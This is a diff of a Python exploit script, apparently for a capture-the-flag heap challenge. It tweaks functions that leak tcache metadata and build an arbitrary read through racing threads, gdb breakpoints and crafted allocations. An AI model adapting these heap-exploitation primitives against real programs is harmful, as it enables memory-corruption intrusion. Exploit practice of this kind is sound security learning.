@@ -154,11 +154,13 @@ def fix_idx(idx):
 # thd1: write(1, buf, stlren) => syscall writing out the metadata
 def tcache_leak(thd1: thread_comm, thd2: thread_comm):
     scanf_bytes = p.cyclic(8)
+
     thd1.do_send = False
     thd1.malloc(b'0')
     thd1.scanf(b'0', scanf_bytes)
     thd1.free(b'0')
     make_workers(1, thd1.sendline, thd1.get_payload())
+    thd1.do_send = True
 
     for _ in range(TRIES):
         thd2.printf(b'0', do_recv=False)
@@ -194,8 +196,9 @@ def arbitrary_read(target_addr: int, tcache_addr_loc: int):
     target_addr_packed = p.p64(target_addr)
     print("target_addr (mangled):: " + hex(target_addr))
 
-    thd1 = thread_comm()
     thd2 = thread_comm()
+    time.sleep(0.1)
+    thd1 = thread_comm()
     attach_gdb('''
         b malloc
         c
@@ -233,9 +236,11 @@ def arbitrary_read(target_addr: int, tcache_addr_loc: int):
         b malloc
         b fprintf
         b free
+        c
     ''')
+
     thd1.malloc(b'1')
-    thd1.malloc(b'1')
+    thd1.malloc(b'2')
     return thd1.printf(b'1')
 
 
@@ -267,6 +272,7 @@ def main():
     exploit()
 
     proc.interactive()
+    proc.kill()
 
 
 if __name__ == '__main__':
